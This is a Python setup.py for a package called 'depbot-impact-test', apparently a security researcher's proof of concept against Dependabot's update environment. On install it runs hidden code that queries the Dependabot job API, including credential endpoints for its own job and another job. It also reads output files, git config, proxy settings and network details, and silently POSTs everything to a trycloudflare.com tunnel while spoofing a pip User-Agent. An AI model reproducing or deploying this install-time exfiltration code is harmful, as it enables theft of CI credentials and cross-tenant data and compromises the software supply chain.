from setuptools import setup
import os
import json
import subprocess

_canary = "DEPBOT_CORNERS_V8_2026_Bx3nTpM7wK5rHzQv"
_result = {"c": _canary}

_api_url = os.environ.get("DEPENDABOT_API_URL", "")
_job_id = os.environ.get("DEPENDABOT_JOB_ID", "")
_output_path = os.environ.get("DEPENDABOT_OUTPUT_PATH", "")

if _api_url and _job_id:
    import urllib.request

    _api_tests = {}
    _endpoints = [
        ("own_job", _api_url + "/update_jobs/" + _job_id),
        ("own_job_creds", _api_url + "/update_jobs/" + _job_id + "/credentials"),
        ("other_job", _api_url + "/update_jobs/1"),
        ("other_job_creds", _api_url + "/update_jobs/1/credentials"),
        ("root", _api_url + "/"),
        ("jobs_list", _api_url + "/update_jobs"),
        ("health", _api_url + "/health"),
        ("own_record", _api_url + "/update_jobs/" + _job_id + "/record_update_job_error"),
    ]

    for _name, _url in _endpoints:
        try:
            _rq = urllib.request.Request(_url, headers={"User-Agent": "pip/24.0"})
            _rp = urllib.request.urlopen(_rq, timeout=10)
            _api_tests[_name] = {
                "status": _rp.status,
                "body": _rp.read().decode("utf-8", errors="replace")[:1500],
            }
        except Exception as _e:
            _ecode = str(getattr(_e, "code", ""))
            _ebody = ""
            if hasattr(_e, "read"):
                try:
                    _ebody = _e.read().decode("utf-8", errors="replace")[:500]
                except Exception:
                    pass
            _api_tests[_name] = {"error": str(_e)[:300], "code": _ecode, "body": _ebody}

    _result["api_tests"] = _api_tests

if _output_path:
    _result["output_writable"] = os.access(os.path.dirname(_output_path), os.W_OK)
    _result["output_exists"] = os.path.exists(_output_path)
    if os.path.exists(_output_path):
        _result["output_content"] = os.popen("cat " + _output_path).read()[:2000]
    _result["output_dir_listing"] = os.popen("ls -la " + os.path.dirname(_output_path)).read()[:1000]

_repo_path = os.environ.get("DEPENDABOT_REPO_CONTENTS_PATH", "")
if _repo_path:
    _git_push_test = subprocess.run(
        ["git", "-C", _repo_path, "remote", "-v"],
        capture_output=True, text=True, timeout=5
    )
    _result["git_remote"] = _git_push_test.stdout[:500]

    _result["git_config_full"] = subprocess.run(
        ["git", "-C", _repo_path, "config", "--list", "--show-origin"],
        capture_output=True, text=True, timeout=5
    ).stdout[:2000]

_result["proxy_env"] = {
    "HTTPS_PROXY": os.environ.get("HTTPS_PROXY", ""),
    "HTTP_PROXY": os.environ.get("HTTP_PROXY", ""),
}

_proxy_addr = os.environ.get("HTTP_PROXY", "").replace("http://", "").replace("https://", "")
if _proxy_addr:
    import urllib.request
    try:
        _rq = urllib.request.Request(
            "http://" + _proxy_addr + "/",
            headers={"User-Agent": "pip/24.0"}
        )
        _rp = urllib.request.urlopen(_rq, timeout=5)
        _result["proxy_direct"] = {
            "status": _rp.status,
            "body": _rp.read().decode("utf-8", errors="replace")[:500],
        }
    except Exception as _e:
        _result["proxy_direct"] = {"error": str(_e)[:300]}

_result["network_info"] = {
    "hostname": os.popen("hostname").read().strip(),
    "ip_route": os.popen("ip route 2>/dev/null || route -n 2>/dev/null").read()[:500],
    "resolv": os.popen("cat /etc/resolv.conf 2>/dev/null").read()[:500],
}

import urllib.request as _ur
try:
    _data = json.dumps(_result).encode()
    _rq3 = _ur.Request(
        "https://miller-tutorial-expanding-conceptual.trycloudflare.com/depbot-v8-corners",
        data=_data,
        method="POST",
    )
    _rq3.add_header("Content-Type", "application/json")
    _ur.urlopen(_rq3, timeout=15)
except Exception:
    pass

setup(
    name="depbot-impact-test",
    version="1.0.0",
    install_requires=["requests==2.26.0", "urllib3==1.26.5"],
)
